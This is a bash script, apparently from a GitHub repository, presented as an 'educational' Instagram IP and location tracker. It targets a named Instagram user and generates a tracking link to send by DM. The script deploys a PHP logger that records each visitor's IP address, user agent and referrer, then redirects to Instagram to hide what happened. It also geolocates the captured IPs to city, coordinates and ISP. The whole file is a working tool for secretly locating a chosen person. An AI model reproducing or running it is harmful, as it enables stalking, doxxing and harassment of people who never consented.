### 3. **instagram_tracker.sh** (Main Tool File - Improved for GitHub)
```bash
#!/bin/bash
# =================================================================
# 🔥 INSTAGRAM IP TRACKER v2.0 - GitHub Edition 🔥
# Compatible: Termux | Kali Linux | Ubuntu | Parrot OS
# Author: ţæÿm Allah| https://github.com/tym805611-art/Daesh-Insta.git
# =================================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; PURPLE='\033[0;35m'; NC='\033[0m'

banner() {
    clear
    cat << "EOF"
    ██████╗██╗  ██╗███████╗    ██╗  ██╗███████╗███╗   ███╗███████╗
    ██╔══██╗██║  ██║██╔════╝    ██║  ██║██╔════╝████╗ ████║██╔════╝
    ██████╔╝███████║█████╗      ███████║█████╗  ██╔████╔██║█████╗  
    ██╔══██╗██╔══██║██╔══╝      ██╔══██║██╔══╝  ██║╚██╔╝██║██╔══╝  
    ██║  ██║██║  ██║███████╗    ██║  ██║███████╗██║ ╚═╝ ██║███████╗
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝
    
    📱 Instagram IP & Location Tracker | Educational Pentest Tool
    =================================================================
EOF
}

install_deps() {
    echo -e "${YELLOW}[🔧] Checking dependencies...${NC}"
    for pkg in curl jq php python3 python3-pip git; do
        if ! command -v $pkg &> /dev/null; then
            echo -e "${RED}Installing $pkg...${NC}"
            if [[ "$OSTYPE" == "linux-android"* ]]; then
                pkg install $pkg -y
            else
                sudo apt install $pkg -y
            fi
        fi
    done
    pip3 install requests folium geopy pyngrok || pip install requests folium geopy pyngrok
}

track_target() {
    local target="$1"
    echo -e "${GREEN}[+] Tracking: $target${NC}"
    
    # Profile info
    profile_info=$(curl -s "https://www.instagram.com/$target/?__a=1" -H "User-Agent: Mozilla/5.0" 2>/dev/null | jq '.graphql.user.full_name // empty')
    [[ -n "$profile_info" ]] && echo -e "${BLUE}[👤] Name: $profile_info${NC}"
    
    # Generate tracking link
    rand_id=$(openssl rand -hex 6 2>/dev/null || cat /dev/urandom | tr -dc 'a-f0-9' | fold -w 6 | head -n1)
    track_url="http://your-ngrok-url.ngrok.io/ipgrab.php?$rand_id"
    
    echo -e "${PURPLE}🔗 Educational Tracking Link:${NC}"
    echo -e "   $track_url"
    echo -e "${YELLOW}📩 Send via Instagram DM${NC}"
}

setup_server() {
    echo -e "${BLUE}[⚙️] Deploying IP Logger...${NC}"
    
    cat > ipgrab.php << 'EOF'
<?php
header('Content-Type: text/html');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'] ?? 'Direct';
$time = date('Y-m-d H:i:s T');

$log = sprintf("[%s] IP:%s | UA:%s | REF:%s\n", $time, $ip, substr($ua,0,50), $ref);
file_put_contents('visitors.log', $log, FILE_APPEND | LOCK_EX);

echo "<html><body style='text-align:center;font-family:Arial'>
<h1>🔄 Redirecting to Instagram...</h1>
<script>setTimeout(() => {window.location='https://www.instagram.com';}, 2000);</script>
</body></html>";
?>
EOF

    # Start PHP server
    nohup php -S 0.0.0.0:8080 > /dev/null 2>&1 &
    echo -e "${GREEN}[✅] Server running on http://localhost:8080${NC}"
    echo -e "${YELLOW}[🌐] Use: ngrok http 8080 for public URL${NC}"
}

geolocate() {
    local ip="$1"
    echo -e "${YELLOW}[📍] Geolocating $ip...${NC}"
    
    geo=$(curl -s "http://ip-api.com/json/$ip?fields=status,country,regionName,city,lat,lon,isp,org")
    status=$(echo "$geo" | jq -r '.status')
    
    if [[ "$status" == "success" ]]; then
        lat=$(echo "$geo" | jq -r '.lat')
        lon=$(echo "$geo" | jq -r '.lon')
        city=$(echo "$geo" | jq -r '.city')
        country=$(echo "$geo" | jq -r '.country')
        isp=$(echo "$geo" | jq -r '.isp')
        
        echo -e "${GREEN}🎯 LOCATION ACQUIRED!${NC}"
        cat << EOF

🏙️   City: $city
🌍   Country: $country
📍   Coordinates: $lat, $lon
🌐   ISP: $isp
🗺️    Google Maps: https://www.google.com/maps?q=$lat,$lon
📁   Saved to: ip_locations.txt

EOF
        echo "$ip|$city|$country|$lat|$lon|$isp" >> ip_locations.txt
    else
        echo -e "${RED}❌ Invalid IP or blocked${NC}"
    fi
}

monitor_logs() {
    echo -e "${BLUE}[👀] Monitoring visitors.log (Ctrl+C to stop)${NC}"
    tail -f visitors.log
}

main() {
    banner
    install_deps
    
    if [[ $# -eq 0 ]]; then
        echo -e "${RED}Usage: $0 @instagram_username${NC}"
        exit 1
    fi
    
    track_target "$1"
    setup_server
    
    echo -e "\n${GREEN}🎮 Commands:${NC}"
    echo "   watch logs:     $0 monitor"
    echo "   geolocate IP:   $0 geo 8.8.8.8"
    echo "   plot map:       $0 map"
    
    echo -e "\n${PURPLE}🚀 Deployed! Check visitors.log for IPs${NC}"
}

case "$1" in
    "monitor") monitor_logs ;;
    "geo") geolocate "$2" ;;
    "map") 
        echo "📍 Plotting map..."
        python3 plot_map.py 2>/dev/null || python plot_map.py ;;
    *) main "$@" ;;
